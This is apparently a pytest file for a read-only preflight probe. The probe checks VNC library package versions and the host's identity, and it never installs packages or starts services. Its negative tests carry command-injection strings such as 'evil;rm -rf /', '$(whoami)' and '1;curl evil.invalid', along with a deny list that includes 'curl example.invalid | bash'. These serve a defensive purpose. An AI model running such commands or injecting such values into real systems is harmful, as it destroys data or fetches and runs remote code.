"""63D-38: synthetic tests never install RFB packages or start services."""
from __future__ import annotations

import json

import pytest

from scripts import clientflow_63d38_rfb_provider_preflight as probe


APT = (
    "x11vnc:\n"
    "  Installed: (none)\n"
    "  Candidate: 0.9.17-2\n"
    "  Version table:\n"
    "     0.9.17-2 500\n"
    "libvncserver1:\n"
    "  Installed: (none)\n"
    "  Candidate: 0.9.15+dfsg-3ubuntu0.2\n"
    "  Version table:\n"
    "libvncclient1:\n"
    "  Installed: (none)\n"
    "  Candidate: 0.9.15+dfsg-3ubuntu0.2\n"
    "  Version table:\n"
    "tigervnc-scraping-server:\n"
    "  Installed: (none)\n"
    "  Candidate: 1.15.0+dfsg-2build1\n"
)
INSTALLED = (
    "libvncserver1:0.9.15+dfsg-3ubuntu0.2:install ok installed\n"
    "libvncclient1:0.9.15+dfsg-3ubuntu0.2:install ok installed\n"
    "freerdp-x11:3.32.2+dfsg-0ubuntu0.26.04.1:install ok installed\n"
    "xvfb:2:21.1.22-1ubuntu1.3:install ok installed\n"
)


def test_candidate_parser_preserves_versions_but_does_not_approve():
    candidate = probe.parse_apt_policy(APT)
    assert candidate["x11vnc"]["candidate"] == "0.9.17-2"
    assert candidate["libvncserver1"]["candidate"] == "0.9.15+dfsg-3ubuntu0.2"
    assert candidate["tigervnc-scraping-server"]["candidate"] == "1.15.0+dfsg-2build1"
    called = []
    def compare(version):
        called.append(version)
        return version == "0.9.15+dfsg-3ubuntu0.2"
    result = probe.assess(
        authorised_host=True, policy_rc=0, policy_raw=APT,
        installed_rc=1, installed_raw=INSTALLED, compare=compare,
    )
    assert result["policy_query_ok"]
    assert result["installed_query_available"]
    assert result["library_candidate_at_least_usn_8494_1"] == {
        "libvncserver1": True, "libvncclient1": True,
    }
    assert len(called) == 2
    assert result["installed_versions"] == {
        "libvncserver1": "0.9.15+dfsg-3ubuntu0.2",
        "libvncclient1": "0.9.15+dfsg-3ubuntu0.2",
    }
    assert result["producer_approved"] is False
    assert result["activation_permitted"] is False
    assert result["filesystem_modified"] is False
    assert result["package_installation_performed"] is False


def test_apt_policy_missing_or_corrupt_never_becomes_approval():
    for content, code in [
        ("", 0), ("wrong-package:\n  Candidate: 99\n", 0),
        ("x11vnc:\n  Candidate: evil;rm -rf /\n", 0),
        (APT, -1),
    ]:
        result = probe.assess(
            authorised_host=True, policy_rc=code, policy_raw=content,
            installed_rc=-1, installed_raw="", compare=lambda _: True,
        )
        assert result["activation_permitted"] is False
        assert result["package_installation_performed"] is False
        assert all(value is None for value in result["library_candidate_at_least_usn_8494_1"].values()) or code == 0


def test_version_parser_refuses_unknown_and_bad_versions():
    assert probe.parse_installed(INSTALLED) == {
        "libvncserver1": "0.9.15+dfsg-3ubuntu0.2",
        "libvncclient1": "0.9.15+dfsg-3ubuntu0.2",
    }
    assert probe.parse_installed(
        "x11vnc:0.9.17-2:install ok installed\n"
        "x11vnc:0.9.17-2:deinstall ok config-files\n"
        "unknown:2:1.0:install ok installed\n"
        "libvncserver1:$(whoami):install ok installed\n"
    ) == {"x11vnc": "0.9.17-2"}
    assert probe.parse_apt_policy(
        "libvncserver1:\n  Candidate: 1:0.9.15+dfsg-3ubuntu0.2\n"
    )["libvncserver1"]["candidate"] == "1:0.9.15+dfsg-3ubuntu0.2"


@pytest.mark.parametrize("host,euid,identity,release", [
    ("other-machine", 0, '{"CLIENT_ID":3}', 'ID=ubuntu\nVERSION_ID="26.04"'),
    (probe.HOST, 1000, '{"CLIENT_ID":3}', 'ID=ubuntu\nVERSION_ID="26.04"'),
    (probe.HOST, 0, '{"CLIENT_ID":99}', 'ID=ubuntu\nVERSION_ID="26.04"'),
    (probe.HOST, 0, "null", 'ID=ubuntu\nVERSION_ID="26.04"'),
    (probe.HOST, 0, '{"CLIENT_ID":3}', 'ID=debian\nVERSION_ID="26.04"'),
    (probe.HOST, 0, '{"CLIENT_ID":3}', 'ID=ubuntu\nVERSION_ID="24.04"'),
])
def test_wrong_host_identity_user_or_os_fails_preflight(host,euid,identity,release):
    assert not probe.target_ok(host,euid,identity,release)


def test_root_host_check_can_be_confirmed_from_observed_client():
    assert probe.target_ok(
        probe.HOST, 0, '{"CLIENT_ID":3}', 'ID=ubuntu\nVERSION_ID="26.04"',
    )


def test_only_fixed_read_only_commands_are_authorised(monkeypatch):
    assert [c[0] for c in probe.READ_COMMANDS] == ["apt-cache", "dpkg-query"]
    for denied in [
        ("apt-get", "install", "-y", "x11vnc"),
        ("systemctl", "start", "gnome-remote-desktop"),
        ("nft", "add", "rule", "inet", "filter", "input"),
        ("bash", "-c", "curl example.invalid | bash"),
        ("dpkg", "-i", "/tmp/unknown.deb"),
    ]:
        with pytest.raises(ValueError, match="Forbidden"):
            probe.readonly_command(denied)
    called = []
    class Result:
        returncode = 0
        stdout = APT
    def fake_run(args, **kwargs):
        called.append((args, kwargs))
        return Result()
    monkeypatch.setattr(probe.subprocess, "run", fake_run)
    rc, output = probe.readonly_command(probe.APT_POLICY)
    assert rc == 0 and output == APT
    assert called[0][1]["check"] is False
    assert called[0][1]["timeout"] == 15


def test_version_comparison_invokes_dpkg_read_only(monkeypatch):
    captured = []
    class Result:
        returncode = 0
    def fake_run(args, **kwargs):
        captured.append(args)
        return Result()
    monkeypatch.setattr(probe.subprocess, "run", fake_run)
    assert probe.dpkg_version_at_least("0.9.15+dfsg-3ubuntu0.2")
    assert captured == [(
        "dpkg", "--compare-versions",
        "0.9.15+dfsg-3ubuntu0.2", "ge",
        "0.9.15+dfsg-3ubuntu0.2",
    )]
    with pytest.raises(ValueError):
        probe.dpkg_version_at_least("1;curl evil.invalid")


def test_wrong_host_fails_before_invoking_apt(monkeypatch, capsys):
    monkeypatch.setattr(probe.socket, "gethostname", lambda: "wrong")
    monkeypatch.setattr(probe.os, "geteuid", lambda: 0)
    monkeypatch.setattr(
        probe, "read_file", lambda path:
        '{"CLIENT_ID":3}' if path == probe.IDENTITY else 'ID=ubuntu\nVERSION_ID="26.04"',
    )
    def forbidden(*_args):
        raise AssertionError("Do not call apt on unauthorised machine")
    monkeypatch.setattr(probe, "readonly_command", forbidden)
    assert probe.main() == 2
    payload = json.loads(capsys.readouterr().out)
    assert payload["activation_permitted"] is False
    assert payload["filesystem_modified"] is False
